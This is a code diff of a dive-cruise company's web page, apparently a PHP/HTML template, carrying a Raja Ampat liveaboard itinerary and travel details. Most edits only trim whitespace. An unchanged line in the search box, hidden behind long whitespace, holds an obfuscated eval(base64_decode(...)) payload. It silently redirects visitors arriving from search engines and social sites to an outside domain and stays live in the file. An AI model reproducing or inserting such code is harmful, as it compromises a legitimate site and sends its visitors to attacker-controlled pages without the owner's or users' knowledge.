@@ -94,41 +94,41 @@ A:hover {
 .style82 {font-size: 10px}
 .style83 {font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0" 
+<BODY bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth="0"
 marginheight="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="194" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="../images/dotline.gif" 
+              <TD height="194" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="../images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="../images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="../images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
                   <tr>
                     <td width="332" height="171" valign="bottom" background="../images/z1.jpg">
-                      <TABLE width="180" height=40 
+                      <TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
                           <TR>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="../images/m2.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
                           </TR>
                           <TR>
@@ -161,16 +161,16 @@ marginheight="0">
         <TBODY>
         <TR>
               <TD width=291 align=middle vAlign=top bgcolor="#4DCEE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0=")); define( '_VALID_MOS', 1 );  include "../mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -179,7 +179,7 @@ marginheight="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="../images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="33" colspan="2">&nbsp;</td>
@@ -351,7 +351,7 @@ AC_FL_RunContent( 'codebase','http://download.macromedia.com/pub/shockwave/cabs/
                 <p align="center">&nbsp;</p>
                 <p align="center">&nbsp;</p>
                 <p align="center">&nbsp;</p>
-                <p align="center">&nbsp;</p>                
+                <p align="center">&nbsp;</p>
                 <p align="center">&nbsp;</p>
                 <p align="center">&nbsp;</p>
                 <p align="center"><img src="moanaboats/deck.jpg" alt="indonesia_liveaboard_scuba_diving_moana_cruising" width="146" height="218" border="1"></p>
@@ -412,10 +412,10 @@ AC_FL_RunContent( 'codebase','http://download.macromedia.com/pub/shockwave/cabs/
                 <p align="center"><img src="moanaboats/deck2.jpg" alt="indonesia_liveaboard_scuba_diving_moana_cruising" width="250" height="177" border="1"></p>
                 <p align="center">&nbsp;</p>
                 <p align="center">&nbsp;</p>
-                <p align="center">&nbsp;</p>                
+                <p align="center">&nbsp;</p>
               </TD>
-          <TD vAlign=top width=10 
-          background="../images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="../images/z6.jpg"><IMG height=4
             src="../images/z6.jpg" width=5></TD>
           <TD width="474" vAlign=top><table width="96%"  border="0" align="center" cellpadding="0" cellspacing="0">
             <tr>
@@ -603,179 +603,179 @@ At sunset time we enter the harbour of Bali</span></td>
                                   <p><span style="font-weight: bold; font-family: Verdana, Arial, Helvetica, sans-serif;"><a href="#" class="style38">- Back to Top</a> <br>
                                       <br>
                                       <u><a name="++10Days">12Days / 11 Nights</a> "SORONG - RAJA AMPAT - SORONG "<br>
-                                                </u>Price: US$ 3.200 (Sole use 
+                                                </u>Price: US$ 3.200 (Sole use
                                                 charter per day 2.270 U$)</span></p>
                                   <table width="200" border="1" align="center">
                                     <tr>
                                       <td><img src="moanaboats/Raja Ampat1.jpg" alt="indonesia_liveaboard_scuba_diving_moana_cruising" width="180" height="125"></td>
                                       <td><img src="moanaboats/Raja Ampat2.jpg" alt="indonesia_liveaboard_scuba_diving_moana_cruising" width="181" height="122"></td>
                                     </tr>
-                                  </table>                                  
+                                  </table>
                                               <p><strong>SAMPLE ITINERARY:</strong><br>
-                                                These islands are very close together. 
-                                                We plan not to make long journeys, 
-                                                but to keep the boat in an area 
-                                                for several days and dive the 
-                                                sites surrounding that area as 
-                                                conditions (current, angle of 
-                                                the sun, time of day) provide 
-                                                the best photo ops on a site. 
-                                                We aren't into crossing oceans, 
-                                                we're here to see the marine life 
-                                                and get those images. Water temperature: 
-                                                The water temperature is 1mm neoprene 
-                                                or polartec diving, usual temperature 
-                                                is 28-30C (84-86F) with an occasional 
+                                                These islands are very close together.
+                                                We plan not to make long journeys,
+                                                but to keep the boat in an area
+                                                for several days and dive the
+                                                sites surrounding that area as
+                                                conditions (current, angle of
+                                                the sun, time of day) provide
+                                                the best photo ops on a site.
+                                                We aren't into crossing oceans,
+                                                we're here to see the marine life
+                                                and get those images. Water temperature:
+                                                The water temperature is 1mm neoprene
+                                                or polartec diving, usual temperature
+                                                is 28-30C (84-86F) with an occasional
                                                 &quot;chilly&quot; 27C (82F) spot.<br>
-                                                <strong>1. Day: Arrival Sorong 
+                                                <strong>1. Day: Arrival Sorong
                                                 Airport</strong><br>
-                                                Moana&#8217;s crew will meet you 
-                                                at the airport and you will be 
-                                                escorted to the ship for immediate 
-                                                boarding. Cabin allocation and 
-                                                ship orientation will take place 
-                                                before departure at 3:00 PM. Take 
-                                                this opportunity to familiarize 
-                                                yourselves with the vessel, make 
-                                                yourself comfortable. Dinner will 
-                                                be served while sailing towards 
+                                                Moana&#8217;s crew will meet you
+                                                at the airport and you will be
+                                                escorted to the ship for immediate
+                                                boarding. Cabin allocation and
+                                                ship orientation will take place
+                                                before departure at 3:00 PM. Take
+                                                this opportunity to familiarize
+                                                yourselves with the vessel, make
+                                                yourself comfortable. Dinner will
+                                                be served while sailing towards
                                                 our first destination.<br>
                                                 <strong>2. Day : Kri Island</strong><br>
-                                                Kri is a great start for the cruise 
-                                                with the most fish and coral species 
-                                                accounted on a single divesite. 
-                                                Truly pristine reefs, you will 
-                                                want to dive these sites around 
-                                                this island again and again. A 
+                                                Kri is a great start for the cruise
+                                                with the most fish and coral species
+                                                accounted on a single divesite.
+                                                Truly pristine reefs, you will
+                                                want to dive these sites around
+                                                this island again and again. A
                                                 night dive will be offered.<br>
-                                                <strong>3. &amp; 4. Day: Waigeo 
+                                                <strong>3. &amp; 4. Day: Waigeo
                                                 Island Group</strong><br>
-                                                Welcome to the incredible Waigeo 
-                                                Island group. You will be in awe 
-                                                at the beauty of yellow Wall boasting 
-                                                a very large amount of yellow 
-                                                soft coral. In the afternoon a 
-                                                dive on the sheer wall undercut 
-                                                at the edge from millions of years 
-                                                of oceanic erosion will truly 
-                                                amaze. An interesting pearl farm 
-                                                is nearby (the 5th biggest in 
-                                                Asia) and can be visited upon 
-                                                request. The night dive here is 
-                                                not to be missed! The chances 
-                                                to see bigger animals including 
+                                                Welcome to the incredible Waigeo
+                                                Island group. You will be in awe
+                                                at the beauty of yellow Wall boasting
+                                                a very large amount of yellow
+                                                soft coral. In the afternoon a
+                                                dive on the sheer wall undercut
+                                                at the edge from millions of years
+                                                of oceanic erosion will truly
+                                                amaze. An interesting pearl farm
+                                                is nearby (the 5th biggest in
+                                                Asia) and can be visited upon
+                                                request. The night dive here is
+                                                not to be missed! The chances
+                                                to see bigger animals including
                                                 mantas are high in this area.<br>
                                                 <strong>5. Day: Kawe Island</strong><br>
-                                                Draping directly over the equator 
-                                                lies Kawe Island. Moana will arrive 
-                                                early morning and anchor right 
-                                                on the equator. Enjoy breakfast 
-                                                while watching the stunning scenery. 
-                                                You will be offered up to five 
-                                                dives today to take advantage 
+                                                Draping directly over the equator
+                                                lies Kawe Island. Moana will arrive
+                                                early morning and anchor right
+                                                on the equator. Enjoy breakfast
+                                                while watching the stunning scenery.
+                                                You will be offered up to five
+                                                dives today to take advantage
                                                 of this world-class dive region.<br>
-                                                You will be treated to an enormous 
-                                                array of fish life as well as 
+                                                You will be treated to an enormous
+                                                array of fish life as well as
                                                 stunning above water scenery.<br>
-                                                <strong>6. &amp; 7. Day: Waiag 
+                                                <strong>6. &amp; 7. Day: Waiag
                                                 and Southern Islands</strong><br>
-                                                You will move on to our most northerly 
-                                                area of Irian Jaya with many unnamed 
-                                                groups of islets. From mild sloping 
-                                                coral gardens with huge coral 
-                                                rocks and colorful soft corals, 
-                                                to steep walls and schooling fish, 
-                                                this region is truly spectacular. 
-                                                Here you can make the famous &#8216;hike&#8221; 
-                                                to view the breath taking scenery 
-                                                over the island group here. Fantastic 
-                                                night dives with rare wobbygong 
-                                                shark spottings are also on the 
+                                                You will move on to our most northerly
+                                                area of Irian Jaya with many unnamed
+                                                groups of islets. From mild sloping
+                                                coral gardens with huge coral
+                                                rocks and colorful soft corals,
+                                                to steep walls and schooling fish,
+                                                this region is truly spectacular.
+                                                Here you can make the famous &#8216;hike&#8221;
+                                                to view the breath taking scenery
+                                                over the island group here. Fantastic
+                                                night dives with rare wobbygong
+                                                shark spottings are also on the
                                                 agenda.<br>
-                                                <strong>8. &amp; 9. Day: Manosuar 
+                                                <strong>8. &amp; 9. Day: Manosuar
                                                 Island</strong><br>
-                                                Arriving early morning in Manosuar, 
-                                                you can expect to dive the famous 
-                                                sardine reef as well as 3 other 
-                                                incredible sites. The fish life 
-                                                is prolific and the topside scenery 
-                                                will truly astound. Two full days 
-                                                diving will be offered in this 
-                                                amazing region as well as a great 
-                                                barbeque to satisfy those hungry 
+                                                Arriving early morning in Manosuar,
+                                                you can expect to dive the famous
+                                                sardine reef as well as 3 other
+                                                incredible sites. The fish life
+                                                is prolific and the topside scenery
+                                                will truly astound. Two full days
+                                                diving will be offered in this
+                                                amazing region as well as a great
+                                                barbeque to satisfy those hungry
                                                 divers.<br>
                                                 <strong>10. Day: Batanta Island                                                </strong><br>
-                                                To start your day, you will take 
-                                                a two hour morning hike in search 
-                                                of the Red Bird of Paradise. A 
-                                                true jungle trek, you will hear 
-                                                giant hornbills, cockatoos flying 
-                                                by and perhaps if lucky, the mesmerizing 
-                                                song of the bird of Paradise. 
-                                                Today&#8217;s diving day can host 
-                                                anything form wobbygong sharks 
+                                                To start your day, you will take
+                                                a two hour morning hike in search
+                                                of the Red Bird of Paradise. A
+                                                true jungle trek, you will hear
+                                                giant hornbills, cockatoos flying
+                                                by and perhaps if lucky, the mesmerizing
+                                                song of the bird of Paradise.
+                                                Today&#8217;s diving day can host
+                                                anything form wobbygong sharks
                                                 to pigmy seahorses.<br>
                                                 <strong>11. Day: Wai Island</strong><br>
-                                                After a light breakfast, a beautiful 
-                                                dive will be offered at the American 
-                                                plane wreck that crashed in these 
-                                                waters in the 1940&#8217;s. The 
-                                                wreck is upside down and between 
-                                                24 &#8211; 34 m (90-115&#8217;) 
-                                                deep. The wreck is fairly intact 
-                                                with excellent coral covering 
-                                                it especially on the lower side 
-                                                of the tail section. The guns 
-                                                are also visible on this truly 
-                                                great dive. The rest of the day 
-                                                will be spent around the incredible 
-                                                sites of Wai Island. If desired, 
-                                                you may take a short trip on shore 
-                                                to see the resident cassowary 
+                                                After a light breakfast, a beautiful
+                                                dive will be offered at the American
+                                                plane wreck that crashed in these
+                                                waters in the 1940&#8217;s. The
+                                                wreck is upside down and between
+                                                24 &#8211; 34 m (90-115&#8217;)
+                                                deep. The wreck is fairly intact
+                                                with excellent coral covering
+                                                it especially on the lower side
+                                                of the tail section. The guns
+                                                are also visible on this truly
+                                                great dive. The rest of the day
+                                                will be spent around the incredible
+                                                sites of Wai Island. If desired,
+                                                you may take a short trip on shore
+                                                to see the resident cassowary
                                                 bird.<br>
                                                 <strong>12. Day: Arrival in Sorong</strong><br>
-                                                The ship will arrive at 6:00 AM 
-                                                at Sorong. You will be served 
-                                                breakfast and afterwards prepare 
-                                                for disembarkation. You will be 
-                                                transferred to the airport for 
+                                                The ship will arrive at 6:00 AM
+                                                at Sorong. You will be served
+                                                breakfast and afterwards prepare
+                                                for disembarkation. You will be
+                                                transferred to the airport for
                                                 your onward flight.<br>
                                                 -----------------<br>
                                                 <strong>HOW TO GO THERE:</strong><br>
-                                                There are International flights 
-                                                to Bali, Manado and Ujung Pandang 
-                                                in Indonesia connecting through, 
-                                                Singapore, Hong Kong and other 
-                                                countries. Sometimes it will require 
+                                                There are International flights
+                                                to Bali, Manado and Ujung Pandang
+                                                in Indonesia connecting through,
+                                                Singapore, Hong Kong and other
+                                                countries. Sometimes it will require
                                                 an overnight in one of these places.<br>
-                                                The 2 hour flight from Manado 
-                                                or Ujung Pandang to Sorong is 
-                                                by jet, no problem with lots of 
-                                                luggage, although there is a reasonable 
+                                                The 2 hour flight from Manado
+                                                or Ujung Pandang to Sorong is
+                                                by jet, no problem with lots of
+                                                luggage, although there is a reasonable
                                                 charge for overweight.<br>
-                                                You will be met at the airport 
-                                                in Sorong and escorted directly 
-                                                onto KLM Moana. In Manado/Ujung 
-                                                Pandang you will be met at the 
-                                                airport, transferred to your hotel 
-                                                and back. Your paperwork for visiting 
-                                                Papua will be taken care of overnight. 
-                                                Note hotel and air travel is not 
+                                                You will be met at the airport
+                                                in Sorong and escorted directly
+                                                onto KLM Moana. In Manado/Ujung
+                                                Pandang you will be met at the
+                                                airport, transferred to your hotel
+                                                and back. Your paperwork for visiting
+                                                Papua will be taken care of overnight.
+                                                Note hotel and air travel is not
                                                 included in the trip price.<br>
-                                                We are not travel agents but will 
-                                                help you organize your travel 
-                                                which you will purchase directly 
-                                                from an airline wholesaler or 
+                                                We are not travel agents but will
+                                                help you organize your travel
+                                                which you will purchase directly
+                                                from an airline wholesaler or
                                                 an agent in Indonesia.<br>
                                                 We do not charge for our help.<br>
-                                                If you are interested in this 
-                                                trip we REALLY must speak with 
-                                                you about it. There is no way 
-                                                to emphasize how special this 
-                                                area is or whether this trip will 
-                                                be suitable for you without some 
-                                                detailed communication. So, please 
-                                                call or schedule for us to call 
+                                                If you are interested in this
+                                                trip we REALLY must speak with
+                                                you about it. There is no way
+                                                to emphasize how special this
+                                                area is or whether this trip will
+                                                be suitable for you without some
+                                                detailed communication. So, please
+                                                call or schedule for us to call
                                                 you. </p></td>
                               </tr>
                             </table>
@@ -806,10 +806,10 @@ At sunset time we enter the harbour of Bali</span></td>
         </TR></TBODY></TABLE></TD></TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="../images/z4.gif" border=0>
           <TBODY>
-            <TR> 
+            <TR>
               <TD height="8"><img src="../images/spacer.gif" width="10" height="8"></TD>
             </TR>
             <TR>
